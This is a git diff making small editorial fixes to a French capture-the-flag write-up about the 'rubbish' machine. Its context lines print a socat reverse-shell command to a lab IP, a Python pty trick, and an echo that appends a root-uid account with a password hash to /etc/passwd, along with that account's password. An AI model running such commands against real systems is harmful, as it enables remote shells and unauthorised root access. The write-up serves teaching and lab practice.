@@ -301,7 +301,7 @@ autumn@rubbish:~$ id
 uid=1001(autumn) gid=1001(autumn) groups=1001(autumn)
 ```
 
-A noter aussi que l'utilisation de *sudo* nécessitait (de mémoire) un shell avec un pty. En dehors de la classique astuce Python (*import pty; pty.spawn('/bin/bash')*) on peut aussi uploader un socat et l'utiliser pour obtenir un reverse shell aux petits oignons :  
+À noter aussi que l'utilisation de *sudo* nécessitait (de mémoire) un shell avec un pty. En dehors de la classique astuce Python (*import pty; pty.spawn('/bin/bash')*) on peut aussi uploader un socat et l'utiliser pour obtenir un reverse shell aux petits oignons :  
 
 ```bash
 ./socat tcp-connect:10.254.0.29:7777 exec:"bash -li",pty,stderr,setsid,sigint,sane
@@ -418,7 +418,7 @@ python3 -c 'import crypt,getpass; print(crypt.crypt(getpass.getpass(), crypt.mks
 
 On rajoute quelques infos autour du hash et on l'ajoute à */etc/passwd* :
 
-```
+```console
 www-data@rubbish:~/nginx$ echo 'devloop:$6$YbrFJJEvCx4..w5p$6kP2eYweyD4v.euBgC7lM9rOsHxWJA8u8dY2d0N3lneDXqeYqbzWMQ7QkOrmZW.3IrRBg.ObylQiAp.9JjNdQ/:0:0:devloop:/root:/bin/bash' >> /etc/passwd
 www-data@rubbish:~/nginx$ su devloop
 Password: thisisdope
